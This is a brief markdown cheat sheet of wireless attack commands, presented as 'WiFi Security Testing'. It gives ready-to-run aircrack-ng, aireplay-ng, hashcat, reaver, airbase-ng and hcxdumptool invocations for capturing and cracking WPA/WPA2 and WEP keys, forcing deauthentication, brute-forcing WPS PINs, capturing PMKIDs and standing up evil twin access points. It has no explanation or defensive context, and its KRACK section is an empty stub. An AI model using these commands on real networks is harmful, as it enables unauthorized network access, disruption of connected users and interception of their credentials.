# WiFi Security Testing

## 1. WiFi Enumeration
```bash
# Scan for networks
airodump-ng wlan0mon
# Detailed scan
airodump-ng --band abg wlan0mon
```

## 2. WPA/WPA2 Handshake Capture
```bash
# Put interface in monitor mode
airmon-ng start wlan0
# Capture handshake
airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon
# Deauth to force handshake
aireplay-ng -0 10 -a <AP_MAC> wlan0mon
```

## 3. WPA/WPA2 Cracking
```bash
# With wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# With hashcat
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
```

## 4. WEP Cracking
```bash
# Capture IVs
airodump-ng -c <channel> --bssid <AP_MAC> -w wep wlan0mon
# ARP replay to generate IVs
aireplay-ng -3 -b <AP_MAC> wlan0mon
# Crack
aircrack-ng wep-01.cap
```

## 5. Evil Twin
```bash
# Create fake AP
airbase-ng -e "TargetWiFi" -c <channel> wlan0mon
# With hostapd
hostapd hostapd.conf
```

## 6. WPS Attack
```bash
# Brute force WPS PIN
reaver -i wlan0mon -b <AP_MAC>
# Pixie dust attack
reaver -i wlan0mon -b <AP_MAC> -K 1
```

## 7. PMKID Attack
```bash
# Capture PMKID
hcxdumptool -i wlan0mon --filterlist_ap=target.txt --filtermode=2 -o capture.pcapng
# Crack
hashcat -m 22000 capture.pcapng /usr/share/wordlists/rockyou.txt
```

## 8. KRACK Attack
```bash
# WPA2 key reinstallation attack
# Exploit 4-way handshake
```

## Tools
```bash
# aircrack-ng
# hashcat
# reaver
# wifite
# hcxdumptool
# hostapd
# Bettercap
```
